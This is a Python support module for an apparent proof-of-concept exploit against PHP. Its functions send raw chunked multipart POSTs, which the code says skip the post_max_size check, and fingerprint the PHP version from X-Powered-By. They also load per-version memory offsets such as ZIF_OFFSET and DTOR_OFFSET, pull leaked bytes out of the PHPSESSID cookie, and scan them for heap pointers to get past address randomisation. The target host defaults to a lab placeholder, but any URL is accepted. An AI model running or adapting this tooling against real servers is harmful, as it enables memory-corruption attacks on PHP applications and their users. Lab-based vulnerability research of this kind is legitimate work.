#!/usr/bin/env python3
"""newPoc common: raw-socket HTTP primitives + cookie extraction + hex dump.

Design goals (see README.md):
  * Every stage is independently callable and observable (hex-dump the cookie).
  * All heap-shape parameters are explicit -> calibratable per glibc/target.
  * Chunked or Content-Length selectable (post_max_size bypass vs not).
"""
from __future__ import annotations
from pathlib import Path
import http.client
import re
import socket
import ssl
import threading
import urllib.parse

DEFAULT_HOST = "LAB_IP"
DEFAULT_PORT = 18113
DEFAULT_TIMEOUT = 45.0


def parse_url(url: str) -> dict:
    """Parse a full URL or bare host:port into (host, port, path, use_tls).

    Examples:
      https://xxx.com/index.php          -> host=xxx.com port=443 path=/index.php tls=True
      http://LAB_IP:18113/index.php -> host=LAB_IP port=18113 path=/index.php tls=False
      LAB_IP:18113                -> host=LAB_IP port=18113 path=/ tls=False
      18113                              -> host=<default> port=18113 path=/ tls=False
    """
    url = url.strip()
    if not url:
        return {"host": DEFAULT_HOST, "port": DEFAULT_PORT, "path": "/", "use_tls": False}

    # Add scheme if missing
    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", url):
        url = "http://" + url

    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or DEFAULT_HOST
    path = parsed.path or "/"
    use_tls = (parsed.scheme == "https")
    if parsed.port:
        port = parsed.port
    else:
        port = 443 if use_tls else 80
    return {"host": host, "port": port, "path": path, "use_tls": use_tls}


def connect(host: str, port: int, use_tls: bool = False,
            timeout: float = DEFAULT_TIMEOUT,
            verify: bool = False) -> socket.socket:
    """TCP (or TLS-wrapped) socket. verify=False → self-signed cert'ler kabul."""
    raw = socket.create_connection((host, port), timeout=timeout)
    if use_tls:
        ctx = ssl.create_default_context()
        if not verify:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        raw = ctx.wrap_socket(raw, server_hostname=host)
    raw.settimeout(timeout)
    return raw


def hexdump(b: bytes, n: int = 256) -> str:
    out = []
    for i in range(0, min(len(b), n), 16):
        chunk = b[i:i + 16]
        hexs = " ".join("%02x" % c for c in chunk)
        asc = "".join(chr(c) if 32 <= c < 127 else "." for c in chunk)
        out.append(f"{i:04x}  {hexs:<48}  {asc}")
    return "\n".join(out)


class Target:
    def __init__(self, host: str = DEFAULT_HOST, port: int = DEFAULT_PORT,
                 path: str = "/", timeout: float = DEFAULT_TIMEOUT,
                 verbose: bool = True, use_tls: bool = False):
        self.host = host
        self.port = port
        self.path = path
        self.timeout = timeout
        self.verbose = verbose
        self.use_tls = use_tls

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    # -- chunked POST (no Content-Length => post_max_size check skipped) -----
    # Mirrors the proven 9bie chunked_send.py: raw socket, single sendall.
    def post_chunked(self, body: bytes, boundary: bytes,
                     extra_headers: dict[str, str] | None = None,
                     read_cap: int = 9 << 20, chunk: int = 65536
                     ) -> tuple[int, bytes]:
        hdr = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
               "Content-Type: multipart/form-data; boundary=%s\r\n"
               "Transfer-Encoding: chunked\r\nConnection: close\r\n") % (
                   self.path, self.host, self.port, boundary.decode())
        for k, v in (extra_headers or {}).items():
            hdr += f"{k}: {v}\r\n"
        hdr += "\r\n"
        out = bytearray(hdr.encode())
        for i in range(0, len(body), chunk):
            piece = body[i:i + chunk]
            out += ("%x\r\n" % len(piece)).encode() + piece + b"\r\n"
        out += b"0\r\n\r\n"

        resp = bytearray()
        s = connect(self.host, self.port, use_tls=self.use_tls,
                    timeout=self.timeout)
        try:
            s.sendall(bytes(out))
            while len(resp) < read_cap:
                c = s.recv(65536)
                if not c:
                    break
                resp.extend(c)
        except OSError:
            pass
        s.close()
        head, _, _ = bytes(resp).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), bytes(resp)

    # -- Content-Length POST (post_max_size applies) -------------------------
    def post_cl(self, body: bytes, boundary: bytes,
                extra_headers: dict[str, str] | None = None,
                read_cap: int = 9 << 20) -> tuple[int, bytes]:
        hdr = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n\r\n"
        ).encode()
        s = connect(self.host, self.port, use_tls=self.use_tls,
                    timeout=self.timeout)
        data = bytearray()

        def _reader() -> None:
            try:
                while len(data) < read_cap:
                    c = s.recv(65536)
                    if not c:
                        break
                    data.extend(c)
            except OSError:
                pass

        r = threading.Thread(target=_reader, daemon=True)
        r.start()
        try:
            s.sendall(hdr)
            mv = memoryview(body)
            for off in range(0, len(body), 262144):
                s.sendall(mv[off:off + 262144])
        except OSError:
            pass
        r.join(self.timeout + 1)
        s.close()
        head, _, bodyb = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), bytes(data)


def read_xpoweredby(host: str, port: int, path: str = "/",
                    timeout: float = 15.0, use_tls: bool = False) -> tuple[int, str]:
    """GET a page and return (status, X-Powered-By value). Empty value if none."""
    s = connect(host, port, use_tls=use_tls, timeout=timeout)
    try:
        s.sendall((f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
                   "Connection: close\r\n\r\n").encode())
        resp = bytearray()
        while len(resp) < (1 << 20):
            c = s.recv(65536)
            if not c:
                break
            resp.extend(c)
    except OSError:
        pass
    s.close()
    head, _, _ = bytes(resp).partition(b"\r\n\r\n")
    m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
    status = int(m.group(1)) if m else 0
    xpb = ""
    for line in head.split(b"\r\n"):
        if line.lower().startswith(b"x-powered-by:"):
            xpb = line.split(b":", 1)[1].strip().decode("latin1", "replace")
    return status, xpb


def php_version_from_xpb(xpb: str) -> str:
    """'PHP/8.4.26' -> '8.4.26'."""
    m = re.search(r"(\d+\.\d+\.\d+)", xpb)
    return m.group(1) if m else ""


_OFFSETS_DIR = str(Path(__file__).resolve().parents[2] / "labs" / "versions")


def load_offsets(version: str) -> dict:
    """Read labs/versions/<version>/offsets.env -> {ZIF_OFFSET, DTOR_OFFSET, ...}."""
    import os
    f = os.path.join(_OFFSETS_DIR, version, "offsets.env")
    if not os.path.exists(f):
        return {}
    out = {}
    for line in open(f):
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        k, v = line.split("=", 1)
        v = v.split("#", 1)[0].strip()
        if v:
            out[k.strip()] = v
    return out


def extract_cookie_line(raw: bytes) -> bytes:
    head, _, _ = raw.partition(b"\r\n\r\n")
    for line in head.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:"):
            return line
    return b"(none)"


def parse_cookie(raw: bytes) -> bytes:
    """URL-decode the PHPSESSID value out of the raw response."""
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", raw)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))


def build_multipart(parts: list[dict], boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        name = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            fn = p["filename"].encode() if isinstance(p["filename"], str) else p["filename"]
            out += b'; filename="' + fn + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def count_heap_pointers(raw: bytes, align_mask: int) -> tuple[int, int]:
    """Count how many 8-byte LE words in raw are heap pointers (0x7f..) after masking.

    Returns (most_common_masked_base, its_count). (0,0) if none.
    """
    from collections import Counter
    c: Counter[int] = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & align_mask] += 1
    if not c:
        return 0, 0
    base, count = c.most_common(1)[0]
    return base, count
